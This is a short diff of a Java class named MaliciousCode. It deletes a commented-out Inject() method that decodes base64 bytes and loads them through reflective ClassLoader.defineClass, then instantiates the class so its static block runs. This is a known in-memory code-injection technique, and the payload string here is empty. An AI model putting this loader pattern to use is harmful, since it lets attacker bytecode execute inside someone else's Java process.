@@ -73,23 +73,5 @@ public class MaliciousCode {
         }
     }
 
-//    public void Inject(){
-//        String base64Code = "";
-//
-//        // 解码 base64
-//        byte[] classBytes = Base64.getDecoder().decode(base64Code);
-//
-//        // 获取当前线程的类加载器
-//        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
-//
-//        // 反射调用defineClass
-//        Method defineClassMethod = ClassLoader.class.getDeclaredMethod("defineClass", String.class, byte[].class, int.class, int.class);
-//        defineClassMethod.setAccessible(true);
-//        Class<?> loadedClass = (Class<?>) defineClassMethod.invoke(classLoader, null, classBytes, 0, classBytes.length);
-//
-//        // 实例化并调用静态代码块
-//        loadedClass.getDeclaredConstructor().newInstance();
-//    }
-
     // 可以选择添加额外的代码，但静态代码块已经在类加载时执行
 }
